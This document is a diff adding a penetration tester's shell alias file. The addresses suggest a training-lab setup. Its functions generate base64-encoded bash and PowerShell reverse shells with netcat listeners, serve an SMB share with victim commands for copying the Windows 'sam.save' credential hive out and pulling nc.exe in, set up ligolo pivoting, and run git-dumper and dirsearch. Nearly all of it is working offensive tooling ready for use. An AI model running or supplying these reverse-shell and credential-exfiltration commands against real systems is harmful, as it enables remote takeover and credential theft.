@@ -1,0 +1,54 @@
+# My own alias:
+
+# Start provisional web server to have access to my tools:
+alias pyweb='python3 -m http.server -d /home/david/Offensive-Security-Tools/ 8888'
+
+# Alias for dirsearch:
+alias dirsearch='python3 /home/david/Offensive-Security-Tools/Enumeration/dirsearch/dirsearch.py'
+
+# Generate power shell reverse shell encoded in BASE64:
+basepower() {
+        IP=$(ip -f inet addr show tun0 | sed -En -e 's/.*inet ([0-9.]+).*/\1/p')
+        python3 /home/david/Offensive-Security-Tools/ReverseShells/PowerShellGenerators/autoPowerShellGen.py $IP "$1" | xclip -selection clipboard
+        xclip -out -selection clipboard
+        sudo nc -nlvp $1
+}
+
+# Generate bash reverse shell encoded in base64:
+basebash() {
+        IP=$(ip -f inet addr show tun0 | sed -En -e 's/.*inet ([0-9.]+).*/\1/p')
+        rev="/bin/bash -i >& /dev/tcp/$IP/$1 0>&1"
+        brev=$(echo -n "$rev" | base64)
+        echo "echo $brev | base64 -d | bash" | xclip -selection clipboard
+        xclip -out -selection clipboard
+        sudo nc -nlvp $1
+}
+
+# Set up ligolo server for pivoting:
+ligon() {
+        sudo ip tuntap add user david mode tun ligolo
+        sudo ip link set ligolo up
+        /home/david/Offensive-Security-Tools/Pivoting/ligolo-proxy -selfcert
+}
+
+smbserver() {
+        echo "########################################################"
+        echo "Commands to use the shared folder:"
+        echo "- net use \\192.168.45.168\share david /user:david"
+        echo "- net use Z: \\192.168.45.205\share david /user:david"
+        echo "- copy sam.save \\192.168.45.205\share\ "
+        echo "- robocopy \\10.10.16.22\share\netcat .\ nc.exe"
+        echo "########################################################"
+impacket-smbserver share $1 -smb2support -user david -password david
+}
+
+gitdump() {
+        if [ $# -lt 2 ]
+        then
+                echo "No arguments supplied"
+                echo "gitdump remoteurl localDirectory"
+                echo "Example: gitdump http://10.10.16.8/ ../savegitdirectory"
+        else
+                python3 /home/david/Offensive-Security-Tools/Miscellaneous/git-dumper/git_dumper.py $1 $2
+        fi
+}
